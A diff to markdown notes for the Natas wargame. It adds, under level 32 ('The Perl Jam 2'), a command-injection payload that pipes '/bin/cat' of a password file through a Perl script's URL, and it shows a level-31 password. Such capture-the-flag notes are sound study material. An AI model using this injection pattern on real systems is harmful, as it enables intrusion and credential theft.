@@ -106,8 +106,10 @@
 #### Level31
 * hay7aecuungiuKaezuathuk9biin0pu1
 
-### Level32
+#### Level32
 * The Perl Jam 2
+> payload: POST /index.pl?|/bin/cat+/etc/natas_webpass/natas32+| 
+
 >   -----------------------------416450785040312578442700592
 
 >   Content-Disposition: form-data; name="file";
